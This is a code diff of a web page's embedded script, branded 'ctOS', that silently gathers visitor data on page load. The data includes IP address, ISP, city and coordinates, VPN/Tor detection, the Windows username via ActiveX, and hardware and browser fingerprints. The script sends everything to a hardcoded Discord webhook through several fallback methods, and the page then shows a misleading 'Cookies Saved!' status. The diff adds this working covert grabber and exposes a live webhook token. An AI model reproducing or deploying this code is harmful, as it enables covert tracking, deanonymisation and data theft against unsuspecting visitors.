@@ -85,54 +85,38 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK
+    //  WEBHOOK (your new one)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
-    // ================================================================
-    //  ENVÍO ÚNICO
-    // ================================================================
-    function sendOnce(msg) {
-        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: msg }),
-            keepalive: true
-        }).catch(() => {});
-        return false;
+    // Status update
+    function setStatus(text, isError = false) {
+        const el = document.getElementById('status');
+        if (el) {
+            el.textContent = text;
+            el.style.color = isError ? '#ff4444' : '#00ff00';
+            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
+        }
     }
 
     // ================================================================
-    //  OBTENER IP CON TIMEOUT DE 500ms
+    //  GET IP WITH AGGRESSIVE TIMEOUT (1.5s)
     // ================================================================
-    function getIPFast() {
-        return new Promise((resolve) => {
-            let resolved = false;
-            const timer = setTimeout(() => {
-                if (!resolved) resolve(null);
-            }, 500);
-
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(500) })
-                .then(r => r.json())
+    function getIPWithTimeout(timeout = 1500) {
+        return Promise.race([
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) })
+                .then(res => res.json())
                 .then(data => {
-                    if (data.ip) {
-                        resolved = true;
-                        clearTimeout(timer);
-                        resolve(data);
-                        return;
-                    }
+                    if (data.ip) return data;
                     throw new Error('No IP');
                 })
                 .catch(() => {
-                    fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
-                        .then(r => r.json())
+                    // fallback to ip-api.com
+                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
+                        .then(res => res.json())
                         .then(data => {
                             if (data.query) {
-                                resolved = true;
-                                clearTimeout(timer);
-                                resolve({
+                                return {
                                     ip: data.query,
                                     org: data.isp,
                                     country_name: data.country,
@@ -141,77 +125,128 @@
                                     latitude: data.lat,
                                     longitude: data.lon,
                                     proxy: data.proxy || false
-                                });
-                            } else {
-                                throw new Error('No IP');
+                                };
                             }
-                        })
-                        .catch(() => {
-                            if (!resolved) {
-                                resolved = true;
-                                clearTimeout(timer);
-                                resolve(null);
-                            }
+                            throw new Error('No IP');
                         });
-                });
-        });
+                }),
+            new Promise((resolve) => setTimeout(() => resolve(null), timeout))
+        ]);
     }
 
     // ================================================================
-    //  DETECCIÓN VPN/TOR VÍA WEBRTC (con timeout de 400ms)
+    //  ENHANCED TOR / VPN DETECTION
     // ================================================================
-    function detectVPNviaWebRTC() {
-        return new Promise((resolve) => {
-            let resolved = false;
-            const timer = setTimeout(() => {
-                if (!resolved) resolve(false);
-            }, 400);
+    function detectTorOrVpnByBrowser(ua) {
+        // 1. Check User-Agent for known Tor or anonymous strings
+        if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
 
+        // 2. Check navigator.webdriver – Tor Browser sets this to true
+        if (navigator.webdriver === true) return true;
+
+        // 3. Check if it's a Firefox-based browser without Chrome – typical Tor pattern
+        if (ua.includes('Firefox') && !ua.includes('Chrome') && ua.includes('rv:')) {
+            // This could be Tor or regular Firefox, but combined with other checks
+            // We'll only count it if we also have no local IP (will be checked later)
+            // We'll set a flag and combine later.
+            // For now, we don't rely solely on this.
+        }
+        return false;
+    }
+
+    function detectViaWebRTC() {
+        return new Promise((resolve) => {
+            let hasRealIP = false;
             let pc = null;
             try {
                 pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                let hasRealIP = false;
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
                 pc.onicecandidate = (e) => {
                     if (!e.candidate) {
                         pc.close();
-                        resolved = true;
-                        clearTimeout(timer);
-                        resolve(!hasRealIP); // Si no hay IP real -> VPN/Tor
+                        resolve(hasRealIP);
                         return;
                     }
                     const parts = e.candidate.candidate.split(' ');
                     if (parts.length > 7) {
                         const ip = parts[4];
+                        // Real IP: not 0.0.0.0, not ::, not 127.0.0.1 (loopback), and not a private range? We'll just check for non-zero.
                         if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                             hasRealIP = true;
                         }
                     }
                 };
-                // Si WebRTC falla, asumimos VPN
                 setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        clearTimeout(timer);
-                        if (pc) pc.close();
-                        resolve(true);
-                    }
-                }, 400);
+                    if (pc) pc.close();
+                    resolve(hasRealIP);
+                }, 2000);
             } catch (e) {
-                resolved = true;
-                clearTimeout(timer);
-                resolve(true); // Bloqueado -> VPN
+                // If WebRTC is completely blocked, treat as no real IP
+                resolve(false);
             }
         });
     }
 
     // ================================================================
-    //  MAIN – EJECUCIÓN PARALELA Y RÁPIDA
+    //  SEND MESSAGE VIA MULTIPLE METHODS
     // ================================================================
-    (function() {
+    function sendMessage(msg) {
+        return new Promise((resolve) => {
+            let sent = false;
+
+            // Method 1: fetch
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg }),
+                keepalive: true
+            })
+            .then(res => {
+                if (res.ok) { sent = true; resolve(true); }
+                else throw new Error('fetch failed');
+            })
+            .catch(() => {
+                // Method 2: sendBeacon
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                if (navigator.sendBeacon(WEBHOOK, blob)) {
+                    sent = true;
+                    resolve(true);
+                } else {
+                    // Method 3: XMLHttpRequest (old school)
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', WEBHOOK, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(JSON.stringify({ content: msg }));
+                        xhr.onload = function() {
+                            if (xhr.status === 200 || xhr.status === 204) {
+                                sent = true;
+                                resolve(true);
+                            }
+                        };
+                        xhr.onerror = function() { resolve(false); };
+                        setTimeout(() => resolve(false), 3000);
+                    } catch (e) {
+                        resolve(false);
+                    }
+                }
+            });
+            // fallback timeout
+            setTimeout(() => resolve(sent), 5000);
+        });
+    }
+
+    // ================================================================
+    //  MAIN
+    // ================================================================
+    (async function() {
         try {
-            // ---- Datos síncronos ----
+            setStatus('Gathering system info...');
+
+            // ---- 1. System info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -241,94 +276,80 @@
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
             let battery = 'Unavailable';
-            if (navigator.getBattery) {
-                Promise.race([
-                    navigator.getBattery().then(b => {
-                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
-                    }),
-                    new Promise(resolve => setTimeout(resolve, 300))
-                ]).catch(() => {});
-            }
+            try {
+                const b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
+            } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const screenRes = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
-            const cpuCores = navigator.hardwareConcurrency || '?';
-            const ram = navigator.deviceMemory || '?';
 
-            // ---- Detección VPN/Tor inicial (rápida) ----
-            let isVpn = false;
-            if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
-            if (navigator.webdriver === true) isVpn = true;
+            // Windows username (ActiveX)
+            let winUser = 'Not available (IE/ActiveX required)';
+            try {
+                const wsh = new ActiveXObject('WScript.Shell');
+                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
+            } catch (e) {}
 
-            // ---- Lanzar IP y WebRTC en paralelo ----
-            const ipPromise = getIPFast();
-            const vpnPromise = detectVPNviaWebRTC();
+            // ---- 2. Detect VPN/Tor via browser heuristics (before IP) ----
+            let isVpn = detectTorOrVpnByBrowser(ua);
 
-            // Esperar a que ambas terminen (o timeout global de 600ms)
-            Promise.all([
-                ipPromise,
-                vpnPromise
-            ]).then(([ipData, vpnDetected]) => {
-                // Si WebRTC dice VPN, forzar true
-                if (vpnDetected) isVpn = true;
+            // Also check WebRTC local IPs to see if they are hidden (common in VPNs/Tor)
+            const hasRealLocalIP = await detectViaWebRTC();
+            if (!hasRealLocalIP) {
+                isVpn = true;
+            }
 
-                // Si IP tiene proxy, forzar true
-                if (ipData && ipData.proxy) isVpn = true;
-                if (ipData && ipData.org) {
+            // ---- 3. Get IP (with timeout, but we will send even if it fails) ----
+            setStatus('Fetching IP...');
+            const ipData = await getIPWithTimeout(1500);
+
+            // ---- 4. Refine VPN detection using IP data (if available) ----
+            if (ipData) {
+                if (ipData.proxy === true) isVpn = true;
+                if (ipData.org) {
                     const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
-                    if (vpnKeywords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
+                    const orgLower = ipData.org.toLowerCase();
+                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
                 }
+            }
 
-                const ip = ipData ? ipData.ip : 'Unknown';
-                const isp = ipData ? ipData.org : 'Unknown ISP';
-                const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
-                const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
+            // ---- 5. Build message ----
+            const ip = ipData ? ipData.ip : 'Unknown';
+            const isp = ipData ? ipData.org : 'Unknown ISP';
+            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
+            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
 
-                // ---- Construir mensaje (sin nombres) ----
-                const msg = 
+            const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
+**Windows Username:** ${winUser}
 **OS:** ${os}
 **Browser:** ${browser}
-**CPU Cores:** ${cpuCores}
-**RAM:** ${ram} GB
-**Screen:** ${screenRes}
+**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
+**RAM:** ${navigator.deviceMemory || '?'} GB
+**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
 **Battery:** ${battery}
 **Time Zone:** ${timezone}
 **GPU:** ${gpu}
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-                // ---- Enviar una sola vez ----
-                sendOnce(msg);
+            // ---- 6. Send immediately (no more waiting) ----
+            setStatus('Sending...');
+            const sent = await sendMessage(msg);
 
-                const el = document.getElementById('status');
-                if (el) {
-                    el.textContent = '✅ Sent!';
-                    el.style.color = '#00ff00';
-                }
-            });
-
-            // Timeout global de seguridad (600 ms) para enviar aunque algo falle
-            setTimeout(() => {
-                // Si no se ha enviado (no hay forma fácil de saberlo), pero como ya se enviará en el then, 
-                // este timeout solo actúa si el then no se ejecuta (por ejemplo, si Promise.all se cuelga).
-                // En la práctica, Promise.all siempre resuelve, así que no hará nada.
-                // Lo dejamos por si acaso.
-            }, 600);
+            if (sent) {
+                setStatus('✅ Cookies Saved!');
+            } else {
+                setStatus('❌ Send failed – check webhook', true);
+            }
 
         } catch (err) {
-            const errMsg = `**ctOS Error**\n${err.message}`;
-            sendOnce(errMsg);
-            const el = document.getElementById('status');
-            if (el) {
-                el.textContent = '❌ Error';
-                el.style.color = '#ff4444';
-                el.style.borderColor = '#ff4444';
-            }
+            setStatus('❌ Error: ' + err.message, true);
+            console.error(err);
         }
     })();
 </script>
